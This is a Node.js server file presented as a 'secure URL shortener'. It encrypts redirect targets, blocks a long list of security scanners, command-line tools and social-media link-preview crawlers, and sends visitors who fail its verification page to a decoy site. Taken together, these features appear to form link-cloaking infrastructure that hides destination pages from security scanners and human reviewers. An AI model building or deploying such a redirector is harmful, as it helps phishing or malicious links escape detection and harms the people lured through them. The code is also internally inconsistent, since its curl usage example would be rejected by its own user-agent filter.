// server.js - Complete production-ready version for Railway deployment
import express from "express";
import crypto from "crypto";
import dotenv from "dotenv";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";

dotenv.config();

const app = express();

// Trust proxy for Railway deployment
app.set('trust proxy', 1);

app.use(express.json());

// Validate and load environment variables with proper error handling
if (!process.env.AES_KEY || !process.env.HMAC_KEY) {
  console.error('❌ Missing required environment variables: AES_KEY and HMAC_KEY must be set');
  console.log('💡 Generate keys with: node -e "console.log(require(\'crypto\').randomBytes(32).toString(\'hex\'))"');
  process.exit(1);
}

let AES_KEY, HMAC_KEY;
try {
  AES_KEY = Buffer.from(process.env.AES_KEY, "hex");
  HMAC_KEY = Buffer.from(process.env.HMAC_KEY, "hex");
  
  // Validate key lengths
  if (AES_KEY.length !== 32) {
    throw new Error('AES_KEY must be exactly 64 hex characters (32 bytes)');
  }
  if (HMAC_KEY.length !== 32) {
    throw new Error('HMAC_KEY must be exactly 64 hex characters (32 bytes)');
  }
  
  console.log('✅ Encryption keys loaded successfully');
} catch (error) {
  console.error('❌ Invalid encryption keys:', error.message);
  console.log('💡 Generate new keys with: node -e "console.log(require(\'crypto\').randomBytes(32).toString(\'hex\'))"');
  process.exit(1);
}

const IPQS_API_KEY = process.env.IPQS_API_KEY;

const ALIAS_FILE = path.resolve("./aliases.json");

// Load aliases
let aliases = {};
try {
  if (fs.existsSync(ALIAS_FILE)) {
    aliases = JSON.parse(fs.readFileSync(ALIAS_FILE));
  }
} catch (e) {
  console.error("Failed to load aliases.json, starting fresh.");
  aliases = {};
}

function saveAliases() {
  fs.writeFileSync(ALIAS_FILE, JSON.stringify(aliases, null, 2));
}

// ===== TRACKING DATA STRUCTURES =====
const humanInteractionData = new Map();
const pendingRedirects = new Map();
const ipRequestCounts = new Map();

const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_MINUTE = 10;

// ===== SECURITY MIDDLEWARE =====
app.use((req, res, next) => {
  // Security headers
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Content-Security-Policy', "default-src 'none'");
  
  // Remove server fingerprinting
  res.removeHeader('X-Powered-By');
  
  next();
});

// Request logging for monitoring
app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent') || 'Unknown';
  console.log(`${new Date().toISOString()} - ${ip} - ${req.method} ${req.path} - ${userAgent}`);
  next();
});

// ===== BOT DETECTION FUNCTIONS =====
function detectBotByUserAgent(userAgent) {
  if (!userAgent || userAgent.length < 10) return true; // Too short or missing
  
  const botPatterns = [
    // Traditional bots
    /bot/i, /crawler/i, /spider/i, /scraper/i, /indexer/i,
    // Social media bots
    /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i, /telegram/i, /discord/i,
    // Command line tools
    /curl/i, /wget/i, /httpie/i, /axios/i, /fetch/i,
    // Programming languages/libraries
    /python/i, /requests/i, /urllib/i, /java/i, /okhttp/i, /apache-httpclient/i,
    // Testing tools
    /postman/i, /insomnia/i, /newman/i, /artillery/i, /selenium/i, /puppeteer/i, /playwright/i,
    // Security scanners
    /nmap/i, /masscan/i, /zmap/i, /nikto/i, /sqlmap/i, /gobuster/i, /dirb/i, /dirbuster/i,
    // Automated tools
    /headless/i, /phantom/i, /slimer/i, /splash/i, /htmlunit/i,
    // Generic suspicious patterns
    /automated/i, /script/i, /test/i, /monitor/i, /check/i, /scan/i,
    // Common bot frameworks
    /scrapy/i, /beautifulsoup/i, /mechanize/i, /jsoup/i,
    // Penetration testing tools
    /burp/i, /zap/i, /metasploit/i, /nessus/i, /openvas/i,
    // Node.js specific
    /node\.?js/i, /npm/i, /yarn/i,
    // Go tools
    /go-http-client/i, /gorequest/i,
    // Rust tools
    /reqwest/i, /hyper/i,
    // Ruby tools
    /ruby/i, /rest-client/i, /faraday/i,
    // PHP tools
    /guzzle/i, /file_get_contents/i,
    // Suspicious version patterns
    /^[\w\-]+\/\d+\.\d+$/i, // Simple name/version format
    /^[A-Z]+$/i, // All caps user agents
  ];
  
  // Check for bot patterns
  if (botPatterns.some(pattern => pattern.test(userAgent))) return true;
  
  // Check for missing browser indicators
  if (!/mozilla|webkit|gecko|chrome|safari|firefox|edge|opera/i.test(userAgent)) {
    return true;
  }
  
  // Check for suspicious version patterns
  if (/version.*version/i.test(userAgent)) return true; // Duplicate version strings
  
  return false;
}

function detectBotByHeaders(headers) {
  // Missing common browser headers
  const requiredHeaders = ['accept', 'accept-language', 'accept-encoding'];
  const missingHeaders = requiredHeaders.filter(h => !headers[h]);
  
  // Suspicious header combinations
  const hasUserAgent = !!headers['user-agent'];
  const hasAccept = !!headers['accept'];
  const hasAcceptLanguage = !!headers['accept-language'];
  const hasAcceptEncoding = !!headers['accept-encoding'];
  
  // Bot indicators in headers
  if (missingHeaders.length > 1) return true;
  if (!hasUserAgent && !hasAccept) return true;
  
  // Check for suspicious accept headers
  if (headers['accept'] && headers['accept'] === '*/*') return true; // Too generic
  
  // Check for automation tools headers
  const automationHeaders = [
    'x-requested-with',
    'x-automation',
    'x-test',
    'x-selenium',
    'x-puppeteer'
  ];
  
  if (automationHeaders.some(header => headers[header])) return true;
  
  // Check for missing referer on direct access (suspicious for bots)
  const isDirectAccess = !headers['referer'];
  const hasMinimalHeaders = !hasAcceptLanguage || !hasAcceptEncoding;
  
  if (isDirectAccess && hasMinimalHeaders) return true;
  
  return false;
}

function isRateLimited(ip) {
  const now = Date.now();
  const ipData = ipRequestCounts.get(ip) || { count: 0, windowStart: now };
  
  // Reset window if expired
  if (now - ipData.windowStart > RATE_LIMIT_WINDOW) {
    ipData.count = 0;
    ipData.windowStart = now;
  }
  
  ipData.count++;
  ipRequestCounts.set(ip, ipData);
  
  return ipData.count > MAX_REQUESTS_PER_MINUTE;
}

async function checkIpReputation(ip) {
  if (!IPQS_API_KEY) {
    console.log("⚠️  IPQS API key not configured - skipping IP reputation check");
    return false;
  }
  
  try {
    const res = await fetch(`https://ipqualityscore.com/api/json/ip/${IPQS_API_KEY}/${ip}`);
    const data = await res.json();
    
    if (!data.success) {
      console.log(`⚠️  IPQS API error: ${data.message} - allowing request`);
      return false;
    }

    // Aggressive detection with combined flags
    const isBot = data.is_bot || data.proxy || data.tor || data.recent_abuse || (data.fraud_score || 0) > 80;

    console.log(`🔍 IPQS check for ${ip}: fraud_score=${data.fraud_score}, is_bot=${data.is_bot}, proxy=${data.proxy}, tor=${data.tor}, recent_abuse=${data.recent_abuse}, blocking=${isBot}`);

    return isBot;
  } catch (error) {
    console.log(`⚠️  IPQS API request failed: ${error.message} - allowing request`);
    return false;
  }
}

// Comprehensive bot detection
async function isSuspiciousRequest(req) {
  const ip = req.ip || req.connection.remoteAddress || '';
  const userAgent = req.get('User-Agent') || '';
  
  console.log(`🔍 Running comprehensive bot detection for ${ip} - ${userAgent}`);
  
  // Multiple detection methods with individual logging
  const checks = [
    { name: 'UserAgent', result: detectBotByUserAgent(userAgent) },
    { name: 'Headers', result: detectBotByHeaders(req.headers) },
    { name: 'RateLimit', result: isRateLimited(ip) },
    { name: 'IPReputation', result: await checkIpReputation(ip) }
  ];
  
  // Log which checks triggered
  const triggered = checks.filter(check => check.result);
  if (triggered.length > 0) {
    console.log(`🚫 Bot detection triggered: ${triggered.map(c => c.name).join(', ')} for ${ip}`);
  }
  
  // If any check fails, it's suspicious
  return checks.some(check => check.result);
}

// Generate human interaction challenge page
function generateChallengePage(challengeId, targetUrl) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying Human...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .challenge-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .verify-btn {
            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
            border: none;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        .verify-btn:hover {
            transform: scale(1.05);
        }
        .verify-btn:active {
            transform: scale(0.95);
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.8;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="challenge-container">
        <h2>🔐 Human Verification</h2>
        <p>Please verify you're human to continue</p>
        <div class="spinner"></div>
        <button class="verify-btn hidden" id="verifyBtn" onclick="verifyHuman()">
            Click to Continue
        </button>
        <div id="status">Analyzing your browser...</div>
    </div>

    <script>
        let interactionScore = 0;
        let mouseMovements = 0;
        let keyboardEvents = 0;
        let clickEvents = 0;
        let startTime = Date.now();
        const challengeId = '${challengeId}';
        
        // Track mouse movements
        document.addEventListener('mousemove', function(e) {
            mouseMovements++;
            interactionScore += 1;
            
            // Human-like mouse movement patterns
            if (e.movementX !== 0 || e.movementY !== 0) {
                interactionScore += 2;
            }
        });
        
        // Track keyboard events
        document.addEventListener('keydown', function(e) {
            keyboardEvents++;
            interactionScore += 5;
        });
        
        // Track clicks
        document.addEventListener('click', function(e) {
            clickEvents++;
            interactionScore += 3;
        });
        
        // Check for human-like behavior patterns
        function checkHumanBehavior() {
            const timeSinceLoad = Date.now() - startTime;
            
            // Bots typically don't move mouse or interact naturally
            const hasMouseMovement = mouseMovements > 5;
            const hasTimeSpent = timeSinceLoad > 1000; // At least 1 second
            const hasInteractions = interactionScore > 10;
            
            return hasMouseMovement || hasTimeSpent || hasInteractions;
        }
        
        // Show verify button after some time or interaction
        setTimeout(() => {
            if (checkHumanBehavior() || Date.now() - startTime > 3000) {
                document.querySelector('.spinner').classList.add('hidden');
                document.getElementById('verifyBtn').classList.remove('hidden');
                document.getElementById('status').textContent = 'Ready for verification';
            }
        }, 2000);
        
        async function verifyHuman() {
            const timeSpent = Date.now() - startTime;
            
            const humanData = {
                challengeId: challengeId,
                interactionScore: interactionScore,
                mouseMovements: mouseMovements,
                keyboardEvents: keyboardEvents,
                clickEvents: clickEvents,
                timeSpent: timeSpent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine
            };
            
            document.getElementById('status').textContent = 'Verifying...';
            document.getElementById('verifyBtn').disabled = true;
            
            try {
                const response = await fetch('/verify-human', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(humanData)
                });
                
                const result = await response.json();
                
                if (result.success) {
                    document.getElementById('status').textContent = '✅ Verified! Redirecting...';
                    setTimeout(() => {
                        window.location.href = result.redirectUrl;
                    }, 1000);
                } else {
                    document.getElementById('status').textContent = '❌ Verification failed. Redirecting...';
                    setTimeout(() => {
                        window.location.href = 'https://calendly.com';
                    }, 2000);
                }
            } catch (error) {
                console.error('Verification error:', error);
                window.location.href = 'https://calendly.com';
            }
        }
        
        // Auto-verify if user shows strong human signals
        setTimeout(() => {
            if (interactionScore > 50 && mouseMovements > 20) {
                verifyHuman();
            }
        }, 5000);
    </script>
</body>
</html>`;
}

// ===== ENCRYPTION FUNCTIONS =====
function encryptURL(url) {
  if (!url || typeof url !== 'string') {
    throw new Error('URL must be a non-empty string');
  }
  
  try {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv("aes-256-cbc", AES_KEY, iv);
    let encrypted = cipher.update(url, "utf8", "hex");
    encrypted += cipher.final("hex");

    const hmac = crypto.createHmac("sha256", HMAC_KEY);
    hmac.update(iv.toString("hex") + encrypted);
    const digest = hmac.digest("hex");

    return `${encrypted}:${digest}:${iv.toString("hex")}`;
  } catch (error) {
    console.error('Encryption error:', error);
    throw new Error('Failed to encrypt URL');
  }
}

function decryptURL(encryptedString) {
  if (!encryptedString || typeof encryptedString !== 'string') {
    return null;
  }
  
  try {
    const parts = encryptedString.split(":");
    if (parts.length !== 3) return null;
    const [encrypted, digest, ivHex] = parts;

    // Validate hex strings
    if (!/^[0-9a-f]+$/i.test(encrypted) || !/^[0-9a-f]+$/i.test(digest) || !/^[0-9a-f]+$/i.test(ivHex)) {
      return null;
    }

    const hmac = crypto.createHmac("sha256", HMAC_KEY);
    hmac.update(ivHex + encrypted);
    if (digest !== hmac.digest("hex")) return null;

    const iv = Buffer.from(ivHex, "hex");
    const decipher = crypto.createDecipheriv("aes-256-cbc", AES_KEY, iv);
    let decrypted = decipher.update(encrypted, "hex", "utf8");
    decrypted += decipher.final("utf8");
    return decrypted;
  } catch (error) {
    console.error('Decryption error:', error);
    return null;
  }
}

// ===== ROUTES =====
app.get("/create", async (req, res) => {
  const target = req.query.url;
  if (!target || typeof target !== 'string') {
    return res.status(400).send("Missing or invalid 'url' parameter");
  }

  // Validate URL format
  try {
    new URL(target);
  } catch {
    return res.status(400).send("Invalid URL format");
  }

  // Bot detection for URL creation
  try {
    if (await isSuspiciousRequest(req)) {
      const ip = req.ip || req.connection.remoteAddress || '';
      console.log(`🚫 Blocked bot from creating URL: ${ip}`);
      return res.status(403).send("Access denied");
    }
  } catch (error) {
    console.error('Bot detection error:', error);
  }

  try {
    const encrypted = encryptURL(target);
    const fullUrl = `${req.protocol}://${req.get("host")}/r/${encrypted}`;
    res.send(fullUrl);
  } catch (e) {
    console.error('URL creation error:', e);
    res.status(500).send("Encryption error");
  }
});

app.post("/alias/create", async (req, res) => {
  const { url, alias } = req.body;
  if (!url || typeof url !== 'string') {
    return res.status(400).json({ error: "'url' is required and must be a string" });
  }

  // Validate URL format
  try {
    new URL(url);
  } catch {
    return res.status(400).json({ error: "Invalid URL format" });
  }

  // Bot detection for alias creation
  try {
    if (await isSuspiciousRequest(req)) {
      const ip = req.ip || req.connection.remoteAddress || '';
      console.log(`🚫 Blocked bot from creating alias: ${ip}`);
      return res.status(403).json({ error: "Access denied" });
    }
  } catch (error) {
    console.error('Bot detection error:', error);
  }

  let encrypted;
  try {
    encrypted = encryptURL(url);
  } catch (error) {
    console.error('Encryption error:', error);
    return res.status(500).json({ error: "Encryption failed" });
  }

  let keyAlias = alias;
  if (!keyAlias || typeof keyAlias !== 'string') {
    keyAlias = crypto.randomBytes(3).toString("hex");
  }

  // Validate alias format
  if (!/^[a-zA-Z0-9\-_]+$/.test(keyAlias)) {
    return res.status(400).json({ error: "Invalid alias format. Use only letters, numbers, hyphens, and underscores." });
  }

  // Check if alias already exists
  if (aliases[keyAlias]) {
    return res.status(409).json({ error: "Alias already exists" });
  }

  try {
    aliases[keyAlias] = encrypted;
    saveAliases();

    const fullUrl = `${req.protocol}://${req.get("host")}/r/${keyAlias}`;
    res.json({ alias: keyAlias, redirectUrl: fullUrl });
  } catch (error) {
    console.error('Alias save error:', error);
    res.status(500).json({ error: "Failed to save alias" });
  }
});

// Human verification endpoint
app.post("/verify-human", (req, res) => {
  const {
    challengeId,
    interactionScore,
    mouseMovements,
    keyboardEvents,
    clickEvents,
    timeSpent,
    screenWidth,
    screenHeight,
    userAgent,
    language,
    timezone,
    cookieEnabled,
    onlineStatus
  } = req.body;

  console.log(`🤖 Human verification attempt for challenge ${challengeId}:`, {
    interactionScore,
    mouseMovements,
    keyboardEvents,
    clickEvents,
    timeSpent
  });

  // Check if challenge exists
  if (!pendingRedirects.has(challengeId)) {
    console.log(`❌ Invalid challenge ID: ${challengeId}`);
    return res.json({ success: false });
  }

  const { targetUrl, ip: originalIp } = pendingRedirects.get(challengeId);
  const currentIp = req.ip || req.connection.remoteAddress || '';

  // Verify IP matches (prevent challenge hijacking)
  if (originalIp !== currentIp) {
    console.log(`❌ IP mismatch for challenge ${challengeId}: ${originalIp} vs ${currentIp}`);
    pendingRedirects.delete(challengeId);
    return res.json({ success: false });
  }

  // Analyze human behavior patterns
  let humanScore = 0;
  
  // Mouse movement patterns (humans move mouse naturally)
  if (mouseMovements > 10) humanScore += 20;
  if (mouseMovements > 50) humanScore += 30;
  
  // Keyboard interaction (humans often press keys)
  if (keyboardEvents > 0) humanScore += 25;
  if (keyboardEvents > 3) humanScore += 35;
  
  // Click patterns (humans click differently than bots)
  if (clickEvents > 0) humanScore += 15;
  if (clickEvents > 2) humanScore += 25;
  
  // Time spent (humans take time to read/process)
  if (timeSpent > 2000) humanScore += 20; // 2+ seconds
  if (timeSpent > 5000) humanScore += 30; // 5+ seconds
  if (timeSpent < 500) humanScore -= 50;  // Too fast = suspicious
  
  // Browser environment checks
  if (screenWidth > 800 && screenHeight > 600) humanScore += 10;
  if (cookieEnabled) humanScore += 10;
  if (onlineStatus) humanScore += 5;
  if (language && language.includes('-')) humanScore += 10; // Proper locale format
  if (timezone && timezone.includes('/')) humanScore += 10; // Proper timezone format
  
  // Overall interaction score
  if (interactionScore > 30) humanScore += 20;
  if (interactionScore > 100) humanScore += 40;
  
  // User agent analysis (basic check for real browser)
  if (userAgent && userAgent.length > 50) humanScore += 15;
  if (userAgent && /mozilla.*chrome.*safari/i.test(userAgent)) humanScore += 20;
  if (userAgent && /firefox/i.test(userAgent)) humanScore += 20;
  if (userAgent && /edge/i.test(userAgent)) humanScore += 20;
  
  // Penalties for bot-like behavior
  if (timeSpent < 1000) humanScore -= 30; // Too fast
  if (mouseMovements === 0 && keyboardEvents === 0) humanScore -= 40; // No interaction
  if (interactionScore === 0) humanScore -= 50; // No interaction score
  
  // Determine if user passes human verification
  const HUMAN_THRESHOLD = 50; // Minimum score to be considered human
  const isHuman = humanScore >= HUMAN_THRESHOLD;
  
  console.log(`🤖 Human verification result for ${challengeId}: Score=${humanScore}, IsHuman=${isHuman}, Threshold=${HUMAN_THRESHOLD}`);
  
  // Clean up the challenge
  pendingRedirects.delete(challengeId);
  
  if (isHuman) {
    // Store successful human verification
    humanInteractionData.set(currentIp, {
      timestamp: Date.now(),
      score: humanScore,
      verified: true
    });
    
    console.log(`✅ Human verification passed for ${currentIp} - redirecting to: ${targetUrl}`);
    return res.json({ 
      success: true, 
      redirectUrl: targetUrl,
      score: humanScore 
    });
  } else {
    console.log(`❌ Human verification failed for ${currentIp} - Score: ${humanScore} < ${HUMAN_THRESHOLD}`);
    return res.json({ 
      success: false,
      score: humanScore,
      threshold: HUMAN_THRESHOLD
    });
  }
});

// Main redirect route
app.get("/r/:param", async (req, res) => {
  const param = req.params.param;
  const ip = req.ip || req.connection.remoteAddress || '';
  
  console.log(`🔗 Redirect request for: ${param} from IP: ${ip}`);

  let target = null;

  // Try to decrypt as encrypted URL first
  target = decryptURL(param);
  
  // If decryption fails, try alias lookup
  if (!target && aliases[param]) {
    target = decryptURL(aliases[param]);
  }

  if (!target) {
    console.log(`❌ Invalid redirect parameter: ${param}`);
    return res.status(404).send("Invalid or expired link");
  }

  console.log(`🎯 Target URL resolved: ${target}`);

  // Check for recent human verification
  const recentVerification = humanInteractionData.get(ip);
  const VERIFICATION_VALIDITY = 300000; // 5 minutes
  
  if (recentVerification && 
      recentVerification.verified && 
      (Date.now() - recentVerification.timestamp) < VERIFICATION_VALIDITY) {
    console.log(`✅ Recent human verification found for ${ip} - direct redirect`);
    return res.redirect(302, target);
  }

  // Run bot detection
  try {
    const isSuspicious = await isSuspiciousRequest(req);
    
    if (!isSuspicious) {
      console.log(`✅ Human-like request detected for ${ip} - direct redirect`);
      // Store as verified human for future requests
      humanInteractionData.set(ip, {
        timestamp: Date.now(),
        score: 100, // High score for passing initial checks
        verified: true
      });
      return res.redirect(302, target);
    }
    
    console.log(`🚫 Suspicious request detected for ${ip} - requiring human verification`);
    
    // Generate challenge for suspicious requests
    const challengeId = crypto.randomBytes(16).toString('hex');
    const challengeExpiry = Date.now() + 600000; // 10 minutes
    
    // Store pending redirect
    pendingRedirects.set(challengeId, {
      targetUrl: target,
      ip: ip,
      expires: challengeExpiry,
      userAgent: req.get('User-Agent') || ''
    });
    
    // Clean up expired challenges periodically
    setTimeout(() => {
      if (pendingRedirects.has(challengeId)) {
        const challenge = pendingRedirects.get(challengeId);
        if (Date.now() > challenge.expires) {
          pendingRedirects.delete(challengeId);
          console.log(`🧹 Expired challenge cleaned up: ${challengeId}`);
        }
      }
    }, 600000); // 10 minutes
    
    console.log(`🎯 Generated challenge ${challengeId} for ${ip} - target: ${target}`);
    
    // Return human verification challenge page
    res.setHeader('Content-Type', 'text/html');
    return res.send(generateChallengePage(challengeId, target));
    
  } catch (error) {
    console.error('Bot detection error:', error);
    // On error, allow redirect but log the issue
    console.log(`⚠️  Bot detection failed for ${ip} - allowing redirect due to error`);
    return res.redirect(302, target);
  }
});

// Health check endpoint for Railway
app.get("/health", (req, res) => {
  res.status(200).json({ 
    status: "healthy",
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    aliases: Object.keys(aliases).length,
    pendingChallenges: pendingRedirects.size
  });
});

// Status endpoint for monitoring
app.get("/status", (req, res) => {
  const stats = {
    server: "URL Shortener with Bot Protection",
    version: "2.0.0",
    uptime: Math.floor(process.uptime()),
    aliases: Object.keys(aliases).length,
    activeChallenges: pendingRedirects.size,
    verifiedHumans: humanInteractionData.size,
    rateLimit: {
      windowMs: RATE_LIMIT_WINDOW,
      maxRequests: MAX_REQUESTS_PER_MINUTE
    },
    security: {
      botDetection: true,
      humanVerification: true,
      ipReputationCheck: !!IPQS_API_KEY,
      encryption: "AES-256-CBC + HMAC-SHA256"
    }
  };
  
  res.json(stats);
});

// Root endpoint with usage instructions
app.get("/", (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure URL Shortener</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        h1 { color: #fff; text-align: center; margin-bottom: 30px; }
        .endpoint {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            margin: 15px 0;
            border-radius: 10px;
            border-left: 4px solid #4ECDC4;
        }
        .method { 
            color: #FF6B6B; 
            font-weight: bold; 
            font-family: monospace;
        }
        .url { 
            color: #4ECDC4; 
            font-family: monospace;
        }
        .description { 
            margin-top: 10px; 
            opacity: 0.9;
        }
        .feature {
            background: rgba(255, 255, 255, 0.05);
            padding: 10px 15px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 3px solid #FF6B6B;
        }
        code {
            background: rgba(0, 0, 0, 0.3);
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Secure URL Shortener</h1>
        <p>A production-ready URL shortener with advanced bot protection and human verification.</p>
        
        <h2>🔗 API Endpoints</h2>
        
        <div class="endpoint">
            <div><span class="method">GET</span> <span class="url">/create?url=&lt;target_url&gt;</span></div>
            <div class="description">Create a new shortened URL. Returns the shortened URL as plain text.</div>
        </div>
        
        <div class="endpoint">
            <div><span class="method">POST</span> <span class="url">/alias/create</span></div>
            <div class="description">
                Create a custom alias. Send JSON: <code>{"url": "target_url", "alias": "custom_name"}</code>
                <br>If alias is omitted, a random one will be generated.
            </div>
        </div>
        
        <div class="endpoint">
            <div><span class="method">GET</span> <span class="url">/r/&lt;shortened_id&gt;</span></div>
            <div class="description">Redirect to the original URL. May show human verification for suspicious requests.</div>
        </div>
        
        <div class="endpoint">
            <div><span class="method">GET</span> <span class="url">/health</span></div>
            <div class="description">Health check endpoint for monitoring.</div>
        </div>
        
        <div class="endpoint">
            <div><span class="method">GET</span> <span class="url">/status</span></div>
            <div class="description">Detailed server status and statistics.</div>
        </div>
        
        <h2>🛡️ Security Features</h2>
        
        <div class="feature">
            <strong>🤖 Advanced Bot Detection</strong>
            <br>Multi-layer bot detection including User-Agent analysis, header inspection, rate limiting, and IP reputation checking.
        </div>
        
        <div class="feature">
            <strong>👤 Human Verification</strong>
            <br>Interactive challenge page that analyzes mouse movements, keyboard events, and behavior patterns to verify human users.
        </div>
        
        <div class="feature">
            <strong>🔐 Military-Grade Encryption</strong>
            <br>URLs are encrypted using AES-256-CBC with HMAC-SHA256 authentication to prevent tampering.
        </div>
        
        <div class="feature">
            <strong>⚡ Rate Limiting</strong>
            <br>Built-in rate limiting (${MAX_REQUESTS_PER_MINUTE} requests per minute) to prevent abuse.
        </div>
        
        <div class="feature">
            <strong>🌐 IP Reputation</strong>
            <br>Integration with IPQualityScore API for real-time IP reputation checking.
        </div>
        
        <div class="feature">
            <strong>🔒 Security Headers</strong>
            <br>Comprehensive security headers including CSP, XSS protection, and clickjacking prevention.
        </div>
        
        <h2>📊 Current Stats</h2>
        <p>
            • Active Aliases: <strong>${Object.keys(aliases).length}</strong><br>
            • Pending Challenges: <strong>${pendingRedirects.size}</strong><br>
            • Verified Humans: <strong>${humanInteractionData.size}</strong><br>
            • Server Uptime: <strong>${Math.floor(process.uptime())}s</strong>
        </p>
        
        <h2>🚀 Example Usage</h2>
        <div class="endpoint">
            <code>curl "${req.protocol}://${req.get("host")}/create?url=https://example.com"</code>
            <br><br>
            <code>curl -X POST "${req.protocol}://${req.get("host")}/alias/create" -H "Content-Type: application/json" -d '{"url":"https://example.com","alias":"my-link"}'</code>
        </div>
    </div>
</body>
</html>
  `);
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ 
    error: 'Internal server error',
    timestamp: new Date().toISOString()
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ 
    error: 'Not found',
    path: req.path,
    method: req.method,
    timestamp: new Date().toISOString()
  });
});

// Cleanup expired data periodically
setInterval(() => {
  const now = Date.now();
  const CLEANUP_INTERVAL = 3600000; // 1 hour
  
  // Clean up expired human verifications
  let cleanedHumans = 0;
  for (const [ip, data] of humanInteractionData.entries()) {
    if (now - data.timestamp > CLEANUP_INTERVAL) {
      humanInteractionData.delete(ip);
      cleanedHumans++;
    }
  }
  
  // Clean up expired challenges
  let cleanedChallenges = 0;
  for (const [challengeId, data] of pendingRedirects.entries()) {
    if (now > data.expires) {
      pendingRedirects.delete(challengeId);
      cleanedChallenges++;
    }
  }
  
  // Clean up rate limit data
  let cleanedRateLimit = 0;
  for (const [ip, data] of ipRequestCounts.entries()) {
    if (now - data.windowStart > RATE_LIMIT_WINDOW * 2) {
      ipRequestCounts.delete(ip);
      cleanedRateLimit++;
    }
  }
  
  if (cleanedHumans > 0 || cleanedChallenges > 0 || cleanedRateLimit > 0) {
    console.log(`🧹 Cleanup completed: ${cleanedHumans} human verifications, ${cleanedChallenges} challenges, ${cleanedRateLimit} rate limit entries`);
  }
}, 600000); // Run cleanup every 10 minutes

// Graceful shutdown handling
process.on('SIGTERM', () => {
  console.log('💾 Received SIGTERM, saving data and shutting down gracefully...');
  try {
    saveAliases();
    console.log('✅ Data saved successfully');
  } catch (error) {
    console.error('❌ Error saving data:', error);
  }
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('💾 Received SIGINT, saving data and shutting down gracefully...');
  try {
    saveAliases();
    console.log('✅ Data saved successfully');
  } catch (error) {
    console.error('❌ Error saving data:', error);
  }
  process.exit(0);
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`
🚀 Secure URL Shortener Server Started
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌐 Server URL: http://localhost:${PORT}
🔒 Security: Multi-layer bot protection enabled
🛡️  Human Verification: Active
🔐 Encryption: AES-256-CBC + HMAC-SHA256
📊 Aliases Loaded: ${Object.keys(aliases).length}
⚡ Rate Limit: ${MAX_REQUESTS_PER_MINUTE} req/min
${IPQS_API_KEY ? '🌍 IP Reputation: Enabled' : '⚠️  IP Reputation: Disabled (set IPQS_API_KEY)'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  `);
});